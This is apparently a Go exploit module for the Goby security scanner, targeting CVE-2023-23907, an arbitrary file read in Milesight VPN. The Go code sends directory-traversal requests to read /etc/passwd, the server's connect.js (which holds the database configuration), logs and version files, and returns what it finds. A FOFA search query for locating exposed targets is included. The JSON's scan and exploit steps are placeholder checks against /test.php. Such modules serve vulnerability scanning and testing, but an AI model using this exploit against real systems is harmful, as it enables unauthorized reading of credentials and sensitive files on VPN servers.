package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Milesight VPN server.js Arbitrary File Read Vulnerability (CVE-2023-23907)",
    "Description": "<p>MilesightVPN is a software, a Milesight product that completes the VPN tunnel setup process and enables connection status through the web server interface.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
    "Product": "Milesight-VPN",
    "Homepage": "https://www.milesight.com/",
    "DisclosureDate": "2023-07-06",
    "PostTime": "2023-08-12",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "body=\"glyphicon-remove\" && body=\"$randdt;\"",
    "GobyQuery": "body=\"glyphicon-remove\" && body=\"$randdt;\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.milesight.com/\">https://www.milesight.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom,log,version,mysql",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../../../../../etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-23907"
    ],
    "CNNVD": [
        "CNNVD-202307-413"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Milesight VPN server.js 任意文件读取漏洞（CVE-2023-23907）",
            "Product": "Milesight-VPN",
            "Description": "<p>MilesightVPN 是一款软件，一个 Milesight 产品的 VPN 通道设置过程更加完善，并可通过网络服务器界面连接状态。<br></p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.milesight.com/\">https://www.milesight.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Milesight VPN server.js Arbitrary File Read Vulnerability (CVE-2023-23907)",
            "Product": "Milesight-VPN",
            "Description": "<p>MilesightVPN is a software, a Milesight product that completes the VPN tunnel setup process and enables connection status through the web server interface.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.milesight.com/\">https://www.milesight.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10823"
}`
	sendPayloadFlag4rpcb := func(hostInfo *httpclient.FixUrl, path string) (*httpclient.HttpResponse, error) {
		if !strings.HasPrefix(path, `/`) {
			path = `/` + path
		}
		payloadRequestConfig := httpclient.NewGetRequestConfig(path)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadFlag4rpcb(hostInfo, "/../../../../../../../../../../../milesight_vpn/server/connect.js")
			if err != nil || resp.StatusCode == 0 {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "vpn_server")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			// 默认为 custom 方式的参数值
			filePath := goutils.B2S(ss.Params["filePath"])
			if attackType != "custom" && attackType != "log" && attackType != "version" && attackType != "mysql" {
				expResult.Success = false
				expResult.Output = "未知的攻击方式"
				return expResult
			}
			if attackType == "log" {
				filePath = `/../../../../../../../../../../../milesight_vpn/logs/forever.log`
			} else if attackType == "version" {
				filePath = `/../../../../../../../../../../../milesight_vpn/urvpn_version`
			} else if attackType == "mysql" {
				filePath = `/../../../../../../../../../../../milesight_vpn/server/connect.js`
			}
			resp, err := sendPayloadFlag4rpcb(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
				return expResult
			}
			return expResult
		},
	))
}
